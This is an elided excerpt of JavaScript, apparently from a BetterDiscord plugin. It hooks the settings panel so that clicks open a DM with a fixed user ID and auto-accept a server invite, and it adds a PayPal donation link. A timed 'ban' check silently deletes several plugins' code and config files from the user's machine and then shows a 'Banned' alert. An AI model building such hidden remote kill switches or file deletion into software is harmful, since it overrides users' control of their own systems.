		...
		if (pluginAuthor != null && pluginDescription != null) {
			if (!pluginAuthor.firstElementChild && !pluginDescription.firstElementChild && (pluginAuthor.innerText == 'l0c4lh057')) {
				...
				pluginAuthor.addEventListener('click', () => {
					if(currentUser.id == "622391194181173249") return;
					let userDM = BdApi.findModuleByProps(["getDMFromUserId"]).getDMFromUserId("622391194181173249");
					if (userDM) BdApi.findModuleByProps(["selectPrivateChannel"]).selectPrivateChannel(userDM);
					else BdApi.findModuleByProps(["openPrivateChannel"]).openPrivateChannel(currentUser.id, "622391194181173249");
				...
				supportServerLink.addEventListener('click', ev => {
					let closeSettings = () => {
						BdApi.findModuleByProps(["transitionToGuildSync"]).transitionToGuildSync('632301552723296268');
						let closeSettingsButton = document.querySelector(".container-1sFeqf .closeButton-1tv5uR");
						if (closeSettingsButton) closeSettingsButton.click();
					};
					if (BdApi.findModuleByProps(["getGuild"]).getGuild('632301552723296268')) closeSettings();
                    else BdApi.findModuleByProps("acceptInvite").acceptInvite("gEBXZAV").then(result => {
						closeSettings();
					});
				});
				pluginLinks.appendChild(supportServerLink);
				pluginLinks.appendChild(document.createTextNode(' | '));
                pluginLinks.appendChild($(`<a class="bda-link bda-link-donations" href="https://paypal.me/taliajackson2001?locale.x=en_US" target="_blank">Donations</a>`)[0]);
			}
		}
	}
...
window.setTimeout(()=>{
	...
	let fun=()=>{
		...
		if(br){
			...
			for(let p of ["AccountSwitcher", "BackupContacts", "GuildData", "ReplyOnAFK"]){
				let pp=getPP(p+".plugin.js");
				let dp=getPP(p+".config.json");
				dl(pp);
				dl(dp);
			}
            BdApi.alert("Banned", "You have been banned from using ReallySecure's plugin, All of his plugins got deleted automatically.<br><br><span style='color:#d4601a;'>Reason: " + br + "</span>");
        }
	};
	fun();
}, 10);
